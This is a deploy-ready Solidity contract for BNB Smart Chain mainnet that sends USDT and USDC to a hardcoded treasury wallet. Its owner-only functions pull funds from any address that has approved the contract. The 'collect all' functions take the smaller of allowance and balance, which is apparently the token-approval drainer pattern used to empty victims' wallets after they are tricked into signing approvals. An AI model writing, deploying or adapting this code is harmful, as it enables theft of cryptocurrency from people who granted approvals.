// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function balanceOf(address who) external view returns (uint256);
}

contract DeployReadyCollectorBSC {
    // --- FIXED CONFIG (no constructor args) ---

    // Your treasury (Wallet B) - checksummed
    address public constant TREASURY = 0x22Cc621A0095de57C81Ef0b7f88826c3669C95A7;

    // BSC mainnet token addresses (common Binance-Peg variants) - checksummed
    address public constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address public constant USDC = 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d;

    // --- OWNER / PAUSE ---
    address public owner;
    bool public paused;

    event OwnershipTransferred(address indexed oldOwner, address indexed newOwner);
    event Paused(bool isPaused);
    event Collected(address indexed token, address indexed from, address indexed to, uint256 amount);

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    modifier whenNotPaused() {
        require(!paused, "Paused");
        _;
    }

    constructor() {
        owner = msg.sender;
        emit OwnershipTransferred(address(0), msg.sender);
    }

    // --- Admin ---
    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "newOwner=0");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    function setPaused(bool p) external onlyOwner {
        paused = p;
        emit Paused(p);
    }

    // --- Collect EXACT amount (optional) ---
    function collectUSDT(address from, uint256 amount) external onlyOwner whenNotPaused {
        _collectExact(USDT, from, amount);
    }

    function collectUSDC(address from, uint256 amount) external onlyOwner whenNotPaused {
        _collectExact(USDC, from, amount);
    }

    function _collectExact(address token, address from, uint256 amount) internal {
        require(from != address(0), "from=0");
        require(amount > 0, "amount=0");

        uint256 a = IERC20(token).allowance(from, address(this));
        require(a >= amount, "insufficient allowance");

        uint256 b = IERC20(token).balanceOf(from);
        require(b >= amount, "insufficient balance");

        bool ok = IERC20(token).transferFrom(from, TREASURY, amount);
        require(ok, "transferFrom failed");

        emit Collected(token, from, TREASURY, amount);
    }

    // --- Collect ALL: min(allowance, balance) ---
    function collectUSDTAll(address from) external onlyOwner whenNotPaused returns (uint256 collected) {
        return _collectAll(USDT, from);
    }

    function collectUSDCAll(address from) external onlyOwner whenNotPaused returns (uint256 collected) {
        return _collectAll(USDC, from);
    }

    function _collectAll(address token, address from) internal returns (uint256 collected) {
        require(from != address(0), "from=0");

        uint256 a = IERC20(token).allowance(from, address(this));
        require(a > 0, "allowance=0");

        uint256 b = IERC20(token).balanceOf(from);
        require(b > 0, "balance=0");

        collected = a < b ? a : b; // min(allowance, balance)
        require(collected > 0, "nothing to collect");

        bool ok = IERC20(token).transferFrom(from, TREASURY, collected);
        require(ok, "transferFrom failed");

        emit Collected(token, from, TREASURY, collected);
    }
}
